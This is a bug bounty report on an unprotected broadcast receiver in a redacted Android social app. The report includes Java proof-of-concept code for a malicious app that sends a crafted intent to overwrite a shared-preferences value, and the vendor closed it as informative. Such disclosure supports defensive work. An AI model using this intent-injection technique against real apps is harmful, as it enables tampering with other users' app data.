## Android  Security Report
- Date: 27th November 2021
- Target: Micro blogging and Social Networking Android App on Play Store
- Reporting platgorm: Hackerone
### Summary
In the target app, the developer dynamically registered a broadcast receiver and implemented unregistering the  broadcast receiver while the app is not in the foreground, which could be considered good practice. However, on the Android system, any app can send intents while another (target) app is running in the foreground. Additionally, using a reverse APK tool, intent filters declared in the app's code can be disclosed.

Through static analysis, it was discovered that the target app did not set the appropriate permissions for the dynamically registered broadcast receiver nor apply strict intent validation for the received intent. This oversight allowed me to build a malicious app capable of writing a value to the target app's shared preferences file.
### Impact
A malicious app can write arbitrary values for key `user_name` to the target apps's shared preferences file.
### POC
- Steps to reproduce
    1. Launch POC app.
    2. Wait 5 seconds.
    3. check the target app's shard preferences file.
        - file path: /data/data/com.xxxxxx/shared_pref/xxxxxx.xml
- Key features of POC app
```java
// MainActivity.java
@Override
protected void onCreate(Bundle savedInstanceState {
	super.onCreate(savedInstanceState);

	// Launch the target app.
	Intent i = getPackageManager().getLaunchIntentForPackage("com.xxxxxx");

	if (i != null) { 
		startActivity(i)
	}
}

@Override

protected void onPause() {
	super.onPause();
	
	Intent i = new Intent(this, EvilService.class);
	
	startService(i);
}


// EvilService.java
@Override
protected void onHandleIntent(@Nullable Intent intent) {

	// This value does not have to be in email format and can be of any length.
	String attack_email = "arbiturary@ema.il";

	try {
		// Wait 5 seconds for the target app to launch and register the receiver.
		Thread.sleep((long) 5000.0);
	} catch (InterruptedException e) {
		e.printStackTrace();
	}

	Bundle bundle_1 = new Bundle();
	bundle_1.putString("email", attack_email);

	Bundle bundle_2 = new Bundle();
	bundle_2.putBundle("********_request_params", bundle_1);

	Intent i = new Intent("com.xxxxxx.intent.action.NEW_NOTIFICATIONS");
	i.putExtra("api", "settings");
	i.putExtra("********", bundle_2);

	sendBroadcast(i);
}
```
### Conclusion
“ Thanks for your report. Looking at the decompiled code of the application, I was indeed
able to locate the BroadcastReceiver and its handler, although, writing the user_name field
in the XML file poses no security concerns.”

As a result, we're closing this submission as ***Informative***.
### Used Tools and Techniques
- ADB
- Frida
- Objection
- Dex2jar
- Jadx
- Python
- Reverse engineering
- Dynamic/Static analysis
- Android app development
### My thought
I was so thrilled and happy that it worked and closed it as informative🔓 Indeed, the value of 'user_name' in shared preferences is not used in any critical logic. The only concern is that it could make users see a weird name in the app like 'Hi, 😈_app_sets_your_name'. Still, it could potentially be dangerous in the future, so it is better to implement proper validation logic on the intent filter.
